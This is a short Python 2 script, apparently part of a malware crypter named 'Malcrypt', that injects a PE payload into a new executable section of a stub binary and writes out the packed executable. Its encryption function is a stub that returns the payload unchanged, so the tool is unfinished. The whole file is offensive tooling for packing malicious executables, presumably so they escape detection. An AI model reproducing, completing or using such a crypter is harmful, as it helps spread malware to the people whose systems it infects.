
import argparse
import pefile
import SectionDoubleP as secdp

def encrypt_payload(plaintext_data):
	return plaintext_data
	pass

def inject_payload(stub, payload_data):
	sections = secdp.SectionDoubleP(stub)
	sections.push_back(Characteristics=0x60000020, 
		Name= ".data1", Data= payload_data)
	pass

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description= "Malcrypt patcher (payload injector).")
	parser.add_argument('-o', '--output', default='malcrypt.generated.exe', 
		help='Write output malcrypt name.')
	parser.add_argument('malcrypt', help='The malcrypt binary stub.')
	parser.add_argument('payload', help='A binary (PE) payload.')
	parser.add_argument('pubkey', help='The public key (to encrypt payload with).')
	args = parser.parse_args()

	### Open the malcrypt stub.
	malcrypt_stub = pefile.PE(args.malcrypt)

	### Read the input payload, then encrypt
	with open(args.payload, 'rb') as fh:
		plaintext_payload_data = fh.read()
	print "Read %d bytes from %s..." % (len(plaintext_payload_data), args.payload)
	ciphertext_payload_data = encrypt_payload(plaintext_payload_data)

	### Inject encrypted payload into stub.
	inject_payload(malcrypt_stub, ciphertext_payload_data)

	malcrypt_stub.write(filename= args.output)
	print "Wrote malcrypt with encrypted payload: %s." % args.output